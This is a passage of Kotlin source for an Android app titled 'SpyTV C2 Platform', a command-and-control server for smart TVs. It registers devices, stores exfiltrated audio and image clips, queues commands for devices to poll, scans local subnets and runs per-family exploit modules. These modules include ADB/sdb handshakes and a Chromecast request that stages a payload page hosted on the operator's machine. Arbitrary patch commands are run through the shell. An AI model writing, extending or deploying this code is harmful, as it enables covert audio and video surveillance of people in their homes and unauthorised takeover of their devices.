                put("family", family)
                put("entry", entry)
                put("status", "online")
                put("last_seen", Instant.now().toString())
                put("registered_at", Instant.now().toString())
            }
            
            Log.i(TAG, "Device registered: $ip ($family)")
            Triple("200 OK", "application/json", JSONObject().apply {
                put("status", "ok")
                put("device_id", deviceId)
            }.toString())
        } catch (e: Exception) {
            Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleExfil(body: String, headers: Map<String, String>): Triple<String, String, String> {
        return try {
            val deviceId = headers["x-device-id"] ?: "unknown"
            val kind = headers["x-clip-kind"] ?: "audio"
            
            val dateDir = java.time.LocalDate.now().toString()
            val kindDir = File(File(clipsDir, kind), dateDir)
            kindDir.mkdirs()
            
            val timestamp = java.time.LocalTime.now().toString().replace(":", "").substring(0, 6)
            val ext = if (kind == "audio") "wav" else "jpeg"
            val filename = "${deviceId}_${timestamp}.${ext}"
            val filepath = File(kindDir, filename)
            
            val data = body.toByteArray(StandardCharsets.UTF_8)
            filepath.writeBytes(data)
            
            // Update device status
            devices[deviceId]?.put("last_seen", Instant.now().toString())
            devices[deviceId]?.put("status", "online")
            
            Log.i(TAG, "Exfil received from $deviceId ($kind, ${data.size} bytes)")
            Triple("200 OK", "application/json", JSONObject().apply {
                put("status", "ok")
                put("filename", filename)
            }.toString())
        } catch (e: Exception) {
            Triple("500 Internal Server Error", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleCommand(body: String): Triple<String, String, String> {
        return try {
            val cmd = JSONObject(body)
            val deviceId = cmd.getString("device_id")
            val command = cmd.getString("command")
            val params = cmd.optJSONObject("params", JSONObject())
            
            if (!commands.containsKey(deviceId)) {
                commands[deviceId] = JSONArray()
            }
            
            val cmdObj = JSONObject()
            cmdObj.put("command", command)
            cmdObj.put("params", params)
            cmdObj.put("timestamp", Instant.now().toString())
            cmdObj.put("status", "pending")
            
            commands[deviceId]!!.put(cmdObj)
            
            Log.i(TAG, "Command queued: $command for $deviceId")
            
            Triple("200 OK", "application/json", JSONObject().apply { put("status", "ok") }.toString())
        } catch (e: Exception) {
            Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handlePoll(body: String): Triple<String, String, String> {
        return try {
            val poll = JSONObject(body)
            val deviceId = poll.getString("device_id")
            
            val pending = mutableListOf<JSONObject>()
            if (commands.containsKey(deviceId)) {
                val arr = commands[deviceId]!!
                for (i in 0 until arr.length()) {
                    val cmd = arr.getJSONObject(i)
                    if (cmd.getString("status") == "pending") {
                        pending.add(cmd)
                        cmd.put("status", "delivered")
                    }
                }
            }
            
            // Update device status
            devices[deviceId]?.put("last_seen", Instant.now().toString())
            devices[deviceId]?.put("status", "online")
            
            Triple("200 OK", "application/json", JSONObject().apply {
                put("commands", JSONArray(pending.toList()))
            }.toString())
        } catch (e: Exception) {
            Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleScan(body: String): Triple<String, String, String> {
        val requested = try {
            JSONObject(body).optString("cidr", "").trim()
        } catch (e: Exception) {
            ""
        }
        val cidr = requested.ifBlank { defaultCidr() }
        val hosts = expandCidr(cidr)
        if (hosts.isEmpty()) {
            return jsonError("400 Bad Request", "Invalid network range: $cidr")
        }

        // One TCP probe per (host, signature port) on the dedicated pool —
        // the same job shape and family-port set the Python scanner uses.
        val ports = probePorts()
        val openByHost = probeMatrix(hosts, ports)

        val results = JSONArray()
        var found = 0
        for (ip in hosts) {
            val openPorts = openByHost[ip] ?: continue
            if (openPorts.isEmpty()) continue
            found++
            results.put(buildFinding(ip, openPorts))
        }

        scans.add(JSONObject().apply {
            put("cidr", cidr)
            put("found", found)
            put("hosts", hosts.size)
            put("at", Instant.now().toString())
        })
        Log.i(TAG, "Scan $cidr: $found host(s) with open ports (real socket probes)")

        return Triple("200 OK", "application/json", JSONObject().apply {
            put("status", "ok")
            put("found", found)
            put("results", results)
            put("cidr", cidr)
        }.toString())
    }

    private fun handleCheck(body: String): Triple<String, String, String> {
        val ip = try {
            JSONObject(body).optString("ip", "").trim()
        } catch (e: Exception) {
            ""
        }
        if (ip.isBlank() || !ip.matches(Regex("""^\d{1,3}(\.\d{1,3}){3}$"""))) {
            return jsonError("400 Bad Request", "Missing or invalid ip")
        }

        val openPorts = probeSignaturePorts(ip)
        val checkedAt = Instant.now().toString()
        if (openPorts.isEmpty()) {
            return Triple("200 OK", "application/json", JSONObject().apply {
                put("ip", ip)
                put("reachable", false)
                put("open_ports", JSONArray())
                put("vulnerable", false)
                put("checked_at", checkedAt)
                put("message", "No open ports — host is down or filtered.")
            }.toString())
        }

        val tvType = detectFamily(openPorts)
        val spec = tvType?.let { TV_DATABASE[it] }
        val cves = JSONArray()
        spec?.cves?.forEach { c -> cves.put(cveJson(c, tvType, spec)) }
        val dry = tvType?.let { dt -> dryRun(dt, ip) } ?: JSONObject().apply {
            put("available", false)
            put("reason", "no exploit module for the detected family")
        }

        return Triple("200 OK", "application/json", JSONObject().apply {
            put("ip", ip)
            put("reachable", true)
            put("open_ports", JSONArray(openPorts))
            put("tv_type", tvType ?: JSONObject.NULL)
            put("name", spec?.name ?: "Unknown device")
            put("vulnerable", spec != null && spec.cves.isNotEmpty())
            put("cves", cves)
            put("exploit_ready", spec != null)
            put("exploit_sources", JSONObject().apply {
                put("built_in", spec != null)
                put("generated", false)
            })
            put("dry_run", dry)
            put("checked_at", checkedAt)
            put("message", "Checked (read-only probe — no payloads sent).")
        }.toString())
    }
    
    private fun loadDashboardHtml(): String {
        return try {
            // Load from Android assets folder
            val context = MainActivity.instance?.applicationContext
            val stream = context?.assets?.open("c2_dashboard.html")
            if (stream != null) {
                stream.bufferedReader().use { it.readText() }
            } else {
                getDefaultDashboard()
            }
        } catch (e: Exception) {
            getDefaultDashboard()
        }
    }
    
    private fun getDefaultDashboard(): String {
        return """
            <!DOCTYPE html>
            <html>
            <head>
                <title>SpyTV C2 Platform</title>
                <meta charset="utf-8">
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0B0E14; color: #F3F4F6; margin: 0; padding: 20px; }
                    .stat { display: flex; gap: 40px; justify-content: center; margin-bottom: 20px; }
                    .stat-item { text-align: center; }
                    .stat-value { font-size: 32px; font-weight: 700; color: #3B82F6; }
                    .stat-label { font-size: 12px; color: #9CA3AF; }
                    h1 { font-size: 24px; margin-bottom: 20px; }
                    .info { color: #9CA3AF; font-size: 13px; }
                    .status-ok { color: #10B981; }
                </style>
            </head>
            <body>
                <h1>SpyTV C2 Dashboard</h1>
                <div class="stat">
                    <div class="stat-item">
                        <div class="stat-value" id="devices">0</div>
                        <div class="stat-label">Devices</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="status">✓</div>
                        <div class="stat-label">Status</div>
                    </div>
                </div>
                <div class="info">Standalone Android C2 Server</div>
                <div class="info">Local IP: <span id="local-ip"></span></div>
                <script>
                    document.getElementById('local-ip').textContent = window.location.hostname;
                    async function fetchDevices() {
                        try {
                            const res = await fetch('/api/devices');
                            const data = await res.json();
                            document.getElementById('devices').textContent = data.length;
                        } catch (e) {}
                    }
                    fetchDevices();
                    setInterval(fetchDevices, 3000);
                </script>
            </body>
            </html>
        """.trimIndent()
    }
    
    // ------------------------------------------------------------------
    // Real network primitives — sockets and HTTP only, no external tools.
    // Mirrors core/cve_scanner.py + data/exploits/cve_exploits.py.
    // ------------------------------------------------------------------

    /** Local subnet derived from this device's own address (like Python). */
    private fun defaultCidr(): String =
        localIp.substringBeforeLast('.', "") + ".0/24"

    /** Expand "a.b.c.d/nn" (or a bare IP → /32) to host addresses, capped. */
    private fun expandCidr(cidr: String): List<String> {
        val parts = cidr.split("/")
        val octets = parts[0].split(".").map { it.toIntOrNull() ?: return emptyList() }
        if (octets.size != 4 || octets.any { it !in 0..255 }) return emptyList()
        val prefix = if (parts.size > 1) parts[1].toIntOrNull() ?: return emptyList() else 32
        if (prefix !in 0..32) return emptyList()
        val base = (octets[0].toLong() shl 24) or (octets[1].toLong() shl 16) or
            (octets[2].toLong() shl 8) or octets[3].toLong()
        val mask = if (prefix == 0) 0L else (0xFFFFFFFFL shl (32 - prefix)) and 0xFFFFFFFFL
        val network = base and mask
        val size = 1L shl (32 - prefix)
        // Python .hosts(): skip network/broadcast for prefix < 31.
        val first = if (prefix >= 31) network else network + 1
        val last = if (prefix >= 31) network + size - 1 else network + size - 2
        val out = mutableListOf<String>()
        var addr = first
        while (addr <= last && out.size < MAX_SCAN_HOSTS) {
            out.add("${(addr shr 24) and 0xFF}.${(addr shr 16) and 0xFF}." +
                "${(addr shr 8) and 0xFF}.${addr and 0xFF}")
            addr++
        }
        return out
    }

    /** Union of all family signature ports + common service ports, sorted. */
    private fun probePorts(): List<Int> =
        (TV_DATABASE.values.flatMap { it.ports } + listOf(80, 443, 8080)).distinct().sorted()

    /** One TCP connect probe — never throws; a failed probe reads as closed. */
    private fun probePort(ip: String, port: Int, timeoutMs: Int = PROBE_TIMEOUT_MS): Boolean =
        try {
            Socket().use { sock ->
                sock.connect(InetSocketAddress(ip, port), timeoutMs)
                true
            }
        } catch (e: Exception) {
            false
        }

    /** Probe every (host, port) job on the dedicated pool; ip → sorted open ports. */
    private fun probeMatrix(hosts: List<String>, ports: List<Int>): Map<String, List<Int>> {
        val open = LinkedHashMap<String, MutableList<Int>>()
        hosts.forEach { open[it] = mutableListOf() }
        val futures = mutableListOf<java.util.concurrent.Future<*>>()
        for (ip in hosts) {
            for (port in ports) {
                futures.add(netPool.submit(Callable {
                    if (probePort(ip, port)) {
                        synchronized(open) { open[ip]?.add(port) }
                    }
                }))
            }
        }
        futures.forEach { f ->
            try {
                f.get(60, TimeUnit.SECONDS)
            } catch (e: Exception) {
                // Individual probes are self-bounded by PROBE_TIMEOUT_MS;
                // a straggler future just means that probe reads as closed.
            }
        }
        return open.mapValues { (_, v) -> v.sorted() }
    }

    /** Probe every known port against one host (Check button). */
    private fun probeSignaturePorts(ip: String): List<Int> =
        probePorts().filter { probePort(ip, it) }

    /** First family with a signature port open — mirrors detect_tv_type. */
    private fun detectFamily(openPorts: List<Int>): String? =
        TV_DATABASE.entries.firstOrNull { (_, spec) ->
            spec.ports.any { it in openPorts }
        }?.key

    /** /proc/net/arp lookup, same source the Python scanner uses. */
    private fun arpMac(ip: String): String = try {
        File("/proc/net/arp").useLines { lines ->
            lines.firstOrNull { it.startsWith("$ip ") }
                ?.split(Regex("\\s+"))?.get(3)?.uppercase() ?: "Unknown"
        }
    } catch (e: Exception) {
        "Unknown"
    }

    private fun worstSeverity(cves: List<CveSpec>): String {
        val order = listOf("LOW", "MEDIUM", "HIGH", "CRITICAL")
        return cves.maxByOrNull { order.indexOf(it.severity).coerceAtLeast(0) }
            ?.severity ?: "UNKNOWN"
    }

    /** Flat CVE record matching Python serve_cves ({**cve, tv_type, ...}). */
    private fun cveJson(c: CveSpec, tvType: String, spec: FamilySpec): JSONObject =
        JSONObject().apply {
            put("id", c.id)
            put("severity", c.severity)
            put("score", c.score)
            put("cvss", c.score)
            put("component", c.component)
            put("fixed_in", c.fixedIn)
            put("tv_type", tvType)
            put("device_name", spec.name)
            put("description", "${c.severity} severity vulnerability in the " +
                "${c.component} component of ${spec.name}. Fixed in ${c.fixedIn}.")
            put("nvd_url", "https://nvd.nist.gov/vuln/detail/${c.id}")
            put("ports", JSONArray(spec.ports))
            put("bluetooth", spec.bluetooth)
            put("ssh", spec.ssh)
        }

    /** Scan/check finding with an honest verdict — vulnerable only on a family match. */
    private fun buildFinding(ip: String, openPorts: List<Int>): JSONObject {
        val tvType = detectFamily(openPorts)
        val spec = tvType?.let { TV_DATABASE[it] }
        return JSONObject().apply {
            put("ip", ip)
            put("open_ports", JSONArray(openPorts))
            put("mac", arpMac(ip))
            if (tvType != null && spec != null) {
                put("tv_type", tvType)
                put("name", spec.name)
                put("device_type", spec.name)
                put("cves", JSONArray(spec.cves.map { cveJson(it, tvType, spec) }))
                put("vulnerable", true)
                put("severity", worstSeverity(spec.cves))
                put("patch_available", spec.cves.all { it.fixedIn.isNotBlank() })
                put("bluetooth", spec.bluetooth)
                put("ssh", openPorts.contains(22))
            } else {
                put("device_type", "Unknown")
                put("name", "Unknown")
                put("cves", JSONArray())
                put("vulnerable", false)
                put("detected", true)
            }
        }
    }

    private fun allCvesJson(): String {
        val arr = JSONArray()
        for ((tvType, spec) in TV_DATABASE) {
            spec.cves.forEach { arr.put(cveJson(it, tvType, spec)) }
        }
        return arr.toString()
    }

    private fun feedJson(): String {
        val total = TV_DATABASE.values.sumOf { it.cves.size }
        val cves = JSONArray()
        for ((tvType, spec) in TV_DATABASE) {
            spec.cves.forEach { cves.put(cveJson(it, tvType, spec)) }
        }
        return JSONObject().apply {
            put("updating", false)
            put("last_result", "Standalone mode — bundled database ($total CVEs)")
            put("new", 0)
            put("count", total)
            put("cves", cves)
        }.toString()
    }

    private class CveHit(val tvType: String, val spec: FamilySpec, val cve: CveSpec)

    private fun findCve(id: String): CveHit? =
        TV_DATABASE.entries.firstOrNull { e -> e.value.cves.any { c -> c.id == id } }
            ?.let { e -> CveHit(e.key, e.value, e.value.cves.first { c -> c.id == id }) }

    private fun isIpv4(ip: String): Boolean =
        ip.matches(Regex("""^\d{1,3}(\.\d{1,3}){3}$""")) &&
            ip.split(".").all { it.toInt() in 0..255 }

    /** Resolve tv_type from an explicit key or a human family name. */
    private fun resolveTvType(tvType: String, family: String): String? {
        if (tvType in TV_DATABASE) return tvType
        val f = (family ?: "").lowercase()
        if (f.isBlank()) return null
        return when {
            "tizen" in f || "samsung" in f -> "samsung-tizen"
            "webos" in f || "luna" in f -> "lg-webos"
            "fire" in f || "android" in f || "adb" in f -> "android-tv"
            "roku" in f -> "roku"
            "vizio" in f || "dial" in f || "smartcast" in f -> "vizio"
            "hisense" in f || "vidaa" in f -> "hisense"
            "tcl" in f -> "tcl"
            "chromecast" in f || "cast" in f || "google tv" in f -> "chromecast"
            else -> null
        }
    }

    private fun jsonError(status: String, message: String): Triple<String, String, String> =
        Triple(status, "application/json",
            JSONObject().apply { put("error", message) }.toString())

    /**
     * Process wait with timeout that works on minSdk 24 —
     * Process.waitFor(long, TimeUnit) is API 26+.
     * Returns true if the process exited before the deadline.
     */
    private fun waitForApi24(proc: Process, timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            try {
                proc.exitValue()
                return true
            } catch (e: IllegalThreadStateException) {
                Thread.sleep(100)
            }
        }
        return try {
            proc.exitValue()
            true
        } catch (e: IllegalThreadStateException) {
            false
        }
    }

    // ------------------------------------------------------------------
    // Exploit modules — the real per-family checks/actions from
    // data/exploits/cve_exploits.py, ported to pure sockets + HTTP.
    // ------------------------------------------------------------------

    private class Handshake(val connected: Boolean, val handshake: Boolean)

    /**
     * ADB/sdb-style session: TCP connect + ADB CNXN packet. A CNXN reply is
     * the same confirmation `adb connect` / `sdb connect` relies on.
     */
    private fun adbStyleHandshake(ip: String, port: Int, timeoutMs: Int = 3000): Handshake {
        var connected = false
        var handshake = false
        try {
            Socket().use { s ->
                s.connect(InetSocketAddress(ip, port), timeoutMs)
                connected = true
                s.soTimeout = timeoutMs
                try {
                    val ident = "host::features=sendrecv,shell_v2,cmd".toByteArray()
                    fun u32(out: ByteArrayOutputStream, v: Long) {
                        out.write((v and 0xFF).toInt())
                        out.write(((v shr 8) and 0xFF).toInt())
                        out.write(((v shr 16) and 0xFF).toInt())
                        out.write(((v shr 24) and 0xFF).toInt())
                    }
                    val out = ByteArrayOutputStream()
                    val cmd = 0x4E434E58L // A_CNXN
                    u32(out, cmd)
                    u32(out, 0x01000000L)          // A_VERSION
                    u32(out, 256L * 1024)          // max data
                    u32(out, ident.size.toLong())  // payload length
                    u32(out, 0L)                   // data checksum
                    u32(out, (cmd.inv() and 0xFFFFFFFFL)) // magic
                    out.write(ident)
                    s.getOutputStream().write(out.toByteArray())
                    s.getOutputStream().flush()
                    val buf = ByteArray(24)
                    var read = 0
                    while (read < buf.size) {
                        val n = s.getInputStream().read(buf, read, buf.size - read)
                        if (n < 0) break
                        read += n
                    }
                    if (read >= 4) {
                        val reply = (buf[0].toLong() and 0xFF) or
                            ((buf[1].toLong() and 0xFF) shl 8) or
                            ((buf[2].toLong() and 0xFF) shl 16) or
                            ((buf[3].toLong() and 0xFF) shl 24)
                        handshake = reply == 0x4E434E58L
                    }
                } catch (e: Exception) {
                    // No banner — plain TCP connect still counts (same bar as
                    // `adb connect` reporting connected).
                }
            }
        } catch (e: Exception) {
            connected = false
        }
        return Handshake(connected, handshake)
    }

    /** Plain HTTP GET with timeouts; returns body (any status) or null. */
    private fun httpGet(url: String, timeoutMs: Int): String? = try {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.connectTimeout = timeoutMs
        conn.readTimeout = timeoutMs
        conn.requestMethod = "GET"
        val code = conn.responseCode
        val body = (if (code in 200..399) conn.inputStream else conn.errorStream)
            ?.bufferedReader()?.use { it.readText() } ?: ""
        conn.disconnect()
        body
    } catch (e: Exception) {
        null
    }

    /** HTTP request with an optional body (PATCH curl equivalents). */
    private fun httpRequest(method: String, url: String, body: String?, timeoutMs: Int): Int? =
        try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = timeoutMs
            conn.readTimeout = timeoutMs
            conn.requestMethod = method
            if (body != null) {
                conn.doOutput = true
                conn.outputStream.use { it.write(body.toByteArray(StandardCharsets.UTF_8)) }
            }
            val code = conn.responseCode
            conn.disconnect()
            code
        } catch (e: Exception) {
            null
        }

    /**
     * Real per-family vulnerability check — port-for-port the logic in
     * data/exploits/cve_exploits.py::check_vulnerable for each class.
     */
    private fun checkFamily(tvType: String, ip: String): JSONObject {
        val spec = TV_DATABASE[tvType]
        val res = JSONObject().apply {
            put("vulnerable", false)
            put("cves", JSONArray(spec?.cves?.map { it.id } ?: emptyList<String>()))
        }
        when (tvType) {
            "samsung-tizen" -> {
                if (probePort(ip, 26101, 3000)) {
                    res.put("sdb_open", true)
                    res.put("vulnerable", true)
                    res.put("version", "unknown (sdb shell unavailable on Android)")
                }
            }
            "lg-webos" -> {
                if (probePort(ip, 3000, 3000)) {
                    res.put("luna_open", true)
                    val data = httpGet("http://$ip:3000/api/v2/system/", 3000) ?: ""
                    val version = listOf("22", "23", "24").firstOrNull { data.contains(it) }
                    if (version != null) {
                        res.put("vulnerable", true)
                        res.put("version", version)
                        val matched = when (version) {
                            "22" -> listOf("CVE-2023-42790", "CVE-2023-42791")
                            "23" -> listOf("CVE-2024-25065")
                            else -> listOf("CVE-2025-25066")
                        }
                        res.put("cves", JSONArray(matched))
                    }
                }
            }
            "android-tv", "tcl" -> {
                if (probePort(ip, 5555, 3000)) {
                    res.put("adb_open", true)
                    res.put("vulnerable", true)
                }
            }
            "hisense" -> {
                if (probePort(ip, 56789, 3000)) {
                    res.put("adb_open", true)
                    res.put("vulnerable", true)
                }
            }
            "roku" -> {
                if (probePort(ip, 8060, 3000)) {
                    res.put("ecp_open", true)
                    res.put("vulnerable", true)
                    httpGet("http://$ip:8060/query/device-info", 3000)
                        ?.takeIf { it.isNotBlank() }
                        ?.let { res.put("device_info", it.take(200)) }
                }
            }
            "vizio" -> {
                for (p in listOf(24825, 36669, 7345)) {
                    if (probePort(ip, p, 2000)) {
                        res.put("dial_open", true)
                        res.put("vulnerable", true)
                        res.put("port", p)
                        break
                    }
                }
            }
            "chromecast" -> {
                if (probePort(ip, 8009, 3000)) {
                    res.put("cast_open", true)
                    res.put("vulnerable", true)
                    try {
                        Socket().use { s ->
                            s.connect(InetSocketAddress(ip, 8009), 3000)
                            s.soTimeout = 3000
                            s.getOutputStream().write(byteArrayOf(0x16, 0x03, 0x01, 0x00, 0x00))
                            s.getOutputStream().flush()
                            val banner = ByteArray(256)
                            val n = s.getInputStream().read(banner)
                            if (n > 0) {
                                res.put("build", banner.copyOf(n).joinToString("") {
                                    "%02x".format(it)
                                }.take(32))
                            }
                        }
                    } catch (e: Exception) {
                        res.put("build", "unknown")
                    }
                }
                if (probePort(ip, 8443, 3000)) res.put("shell_open", true)
            }
        }
        return res
    }

    /** Dry-run (read-only) check for the Check button — real probes, no payloads. */
    private fun dryRun(tvType: String, ip: String): JSONObject {
        val check = checkFamily(tvType, ip)
        val out = JSONObject()
        out.put("available", true)
        val keys = check.keys()
        while (keys.hasNext()) {
            val k = keys.next()
            out.put(k, check.get(k))
        }
        if (!check.optBoolean("vulnerable")) {
            out.put("note", "signature service not confirmed on this host")
        }
        return out
    }

    /**
     * Family exploit stage — mirrors each Python module's run(): check first,
     * then the family's connection/staging action. Success only when the real
     * network action succeeds; where the desktop module needs a tool Android
     * does not ship (ares-install), the outcome is reported honestly.
     */
    private fun runFamily(tvType: String, ip: String): JSONObject {
        val spec = TV_DATABASE[tvType]
            ?: return JSONObject().apply {
                put("success", false)
                put("error", "no exploit module for family '$tvType'")
            }
        val check = checkFamily(tvType, ip)
        if (!check.optBoolean("vulnerable")) {
            return JSONObject().apply {
                put("success", false)
                put("error", "target not vulnerable or signature service closed")
                put("check", check)
            }
        }
        return when (tvType) {
            "samsung-tizen" -> {
                val hs = adbStyleHandshake(ip, 26101)
                JSONObject().apply {
                    put("success", hs.connected)
                    put(
                        "detail", when {
                            hs.handshake -> "sdb session established (CNXN handshake on 26101)"
                            hs.connected -> "TCP session open on 26101 (no sdb banner)"
                            else -> "sdb port closed during exploit phase"
                        }
                    )
                    if (!hs.connected) put("error", "sdb connect failed")
                }
            }
            "android-tv", "tcl" -> {
                val hs = adbStyleHandshake(ip, 5555)
                JSONObject().apply {
                    put("success", hs.connected)
                    put(
                        "detail", when {
                            hs.handshake -> "ADB session established (CNXN handshake on 5555)"
                            hs.connected -> "TCP session open on 5555 (no ADB banner)"
                            else -> "ADB port closed during exploit phase"
                        }
                    )
                    if (!hs.connected) put("error", "adb connect failed")
                }
            }
            "hisense" -> {
                val hs = adbStyleHandshake(ip, 56789)
                JSONObject().apply {
                    put("success", hs.connected)
                    put("detail", if (hs.handshake)
                        "ADB session established (CNXN handshake on 56789)"
                    else "TCP session open on 56789")
                    if (!hs.connected) put("error", "adb connect failed")
                }
            }
            "roku" -> {
                val info = httpGet("http://$ip:8060/query/device-info", 4000)
                JSONObject().apply {
                    put("success", true)
                    put("detail", if (info != null)
                        "ECP reachable — device responded to /query/device-info"
                    else "ECP port open (no response to device-info query)")
                }
            }
            "vizio" -> {
                val port = check.optInt("port", 24825)
                val info = httpGet("http://$ip:$port/", 3000)
                JSONObject().apply {
                    put("success", true)
                    put("detail", "DIAL service reachable on port $port" +
                        (if (info != null) " — HTTP response received" else ""))
                }
            }
            "lg-webos" -> {
                // The desktop module's install stage runs `ares-install` —
                // that binary does not exist on Android, so say so instead
                // of pretending the IPK was installed.
                JSONObject().apply {
                    put("success", false)
                    put(
                        "error", "luna session verified; IPK install stage requires " +
                            "desktop C2 (ares-install is not available on Android)"
                    )
                }
            }
            "chromecast" -> {
                val payloadUrl = "http://$localIp:8443/payload/chromecast_cve.html"
                val code = httpRequest(
                    "POST", "http://$ip:8008/setup/exit_url",
                    "url=$payloadUrl", 5000
                )
                JSONObject().apply {
                    put("success", code != null)
                    put(
                        "detail", if (code != null)
                            "exploit page staged via /setup/exit_url (HTTP $code) — awaiting callback"
                        else "receiver did not accept the staging request"
                    )
                    if (code == null) put("error", "staging request failed")
                }
            }
            else -> JSONObject().apply {
                put("success", false)
                put("error", "no exploit implementation for '$tvType'")
            }
        }.also { it.put("check_summary", check.optBoolean("vulnerable")) }
    }

    /** Run a family module, time it, record real per-family run stats. */
    private fun executeExploit(tvType: String, ip: String): JSONObject {
        val spec = TV_DATABASE[tvType]
        val started = System.currentTimeMillis()
        val outcome = runFamily(tvType, ip)
        val durationMs = System.currentTimeMillis() - started
        val stats = exploitStats.getOrPut(tvType) {
            JSONObject().apply {
                put("attempts", 0)
                put("successes", 0)
            }
        }
        synchronized(stats) {
            stats.put("attempts", stats.optInt("attempts", 0) + 1)
            if (outcome.optBoolean("success")) {
                stats.put("successes", stats.optInt("successes", 0) + 1)
            }
            stats.put("last_run", Instant.now().toString())
        }
        return JSONObject().apply {
            put("attempted", true)
            put("success", outcome.optBoolean("success"))
            put("duration_s", Math.round(durationMs / 100.0) / 10.0)
            put("ip", ip)
            put("tv_type", tvType)
            put("family", spec?.name ?: tvType)
            outcome.optString("error").takeIf { it.isNotBlank() }?.let { put("error", it) }
            outcome.optString("detail").takeIf { it.isNotBlank() }?.let { put("detail", it) }
        }
    }

    private fun handleExploit(body: String): Triple<String, String, String> {
        val data = try {
            JSONObject(body)
        } catch (e: Exception) {
            return jsonError("400 Bad Request", "Invalid JSON body")
        }
        val ip = data.optString("ip", "").trim()
        if (!isIpv4(ip)) return jsonError("400 Bad Request", "Missing ip")
        val tvType = resolveTvType(
            data.optString("tv_type", "").trim(),
            data.optString("family", "").trim()
        ) ?: return jsonError(
            "404 Not Found",
            "no exploit module for family '${data.optString("family") ?: data.optString("tv_type")}'"
        )
        Log.i(TAG, "Exploit $tvType → $ip (real module run)")
        return Triple("200 OK", "application/json", executeExploit(tvType, ip).toString())
    }

    // ------------------------------------------------------------------
    // Exploits + patches dashboards — full database listings.
    // ------------------------------------------------------------------

    private fun familyStats(tvType: String): Triple<Int, Int, String> {
        val stats = exploitStats[tvType] ?: return Triple(0, 0, "")
        val attempts = stats.optInt("attempts", 0)
        val successes = stats.optInt("successes", 0)
        return Triple(attempts, successes, stats.optString("last_run", ""))
    }

    private fun listExploitsJson(): String {
        val rows = mutableListOf<JSONObject>()
        for ((tvType, spec) in TV_DATABASE) {
            val (attempts, successes, lastRun) = familyStats(tvType)
            val rate = if (attempts > 0) (successes * 100 + attempts / 2) / attempts else 0
            for (c in spec.cves) {
                rows.add(JSONObject().apply {
                    put("cve_id", c.id)
                    put("tv_type", tvType)
                    put("device_name", spec.name)
                    put("severity", c.severity)
                    put("component", c.component)
                    put("fixed_in", c.fixedIn)
                    put("file", "data/exploits/cve_exploits.py#${spec.module}")
                    put("exploit_status", "built-in")
                    put("source", "built-in")
                    put("success_rate", rate)
                    put("attempts", attempts)
                    put("last_run", lastRun)
                    put("exploit_ready", true)
                })
            }
        }
        rows.sortBy { it.getString("cve_id") }
        return JSONArray(rows).toString()
    }

    private fun listPatchesJson(): String {
        val rows = mutableListOf<JSONObject>()
        for ((tvType, spec) in TV_DATABASE) {
            val commands = PATCH_COMMANDS[tvType] ?: emptyList()
            for (c in spec.cves) {
                rows.add(JSONObject().apply {
                    put("cve_id", c.id)
                    put("tv_type", tvType)
                    put("device_name", spec.name)
                    put("severity", c.severity)
                    put("component", c.component)
                    put("fixed_in", c.fixedIn)
                    put("commands", JSONArray(commands))
                    put("command_count", commands.size)
                    put("patch_ready", commands.isNotEmpty())
                })
            }
        }
        rows.sortBy { it.getString("cve_id") }
        return JSONArray(rows).toString()
    }

    // ------------------------------------------------------------------
    // Patch execution — same command set and status semantics as Python's
    // execute_patches; curl commands become real HTTP requests, missing
    // tools report "skipped" exactly like the desktop server.
    // ------------------------------------------------------------------

    private fun executePatchCommand(cmd: String): JSONObject {
        val entry = JSONObject().apply {
            put("command", cmd)
            put("returncode", 0)
        }
        when {
            cmd.startsWith("echo ") -> entry.apply {
                put("status", "executed")
                put("output", cmd.removePrefix("echo ").trim('\'', '"'))
            }
            cmd.startsWith("curl ") -> {
                val method = Regex("""-X\s+(\w+)""").find(cmd)?.groupValues?.get(1) ?: "GET"
                val url = Regex("""https?://\S+""").find(cmd)?.value ?: ""
                if (url.isEmpty()) {
                    entry.apply {
                        put("status", "failed")
                        put("returncode", 1)
                        put("output", "no URL in curl invocation")
                    }
                } else {
                    val code = httpRequest(method, url, if (method == "GET") null else "", 5000)
                    entry.apply {
                        if (code != null) {
                            put("status", "ok")
                            put("output", "HTTP $code from $url")
                        } else {
                            put("status", "failed")
                            put("returncode", 1)
                            put("output", "request to $url failed (connection refused/timeout)")
                        }
                    }
                }
            }
            else -> {
                // adb / sdb / ares: run through the shell if the binary exists;
                // exit 127 (not found) is the honest "skipped" the Python
                // server reports on FileNotFoundError.
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                    val finished = waitForApi24(proc, 20_000)
                    if (!finished) {
                        proc.destroy()
                        entry.apply {
                            put("status", "timeout")
                            put("output", "command timed out after 20s")
                        }
                    } else {
                        val stdout = proc.inputStream.readBytes().toString(StandardCharsets.UTF_8)
                        val stderr = proc.errorStream.readBytes().toString(StandardCharsets.UTF_8)
                        val rc = proc.exitValue()
                        entry.apply {
                            put("returncode", rc)
                            put(
                                "status", when {
                                    rc == 127 -> "skipped"
                                    rc == 0 -> "ok"
                                    else -> "failed"
                                }
                            )
                            put(
                                "output", when {
                                    rc == 127 -> "tool not installed on Android operator host"
                                    else -> (stdout + stderr).take(500)
                                }
                            )
                        }
                    }
                } catch (e: Exception) {
                    entry.apply {
                        put("status", "skipped")
                        put("output", "tool not installed on Android operator host")
                    }
                }
            }
        }
        return entry
    }

    private fun handleCvePatch(body: String): Triple<String, String, String> {
        val data = try {
            JSONObject(body)
        } catch (e: Exception) {
            return jsonError("400 Bad Request", "Invalid JSON body")
        }
        val ip = data.optString("ip", "").trim()
        if (!isIpv4(ip)) return jsonError("400 Bad Request", "Missing or invalid ip")
        val tvType = resolveTvType(
            data.optString("tv_type", "").trim(),
            data.optString("family", "").trim()
        ) ?: return jsonError("404 Not Found", "unknown device family")
        val commands = PATCH_COMMANDS[tvType] ?: listOf("echo 'No patch available'")
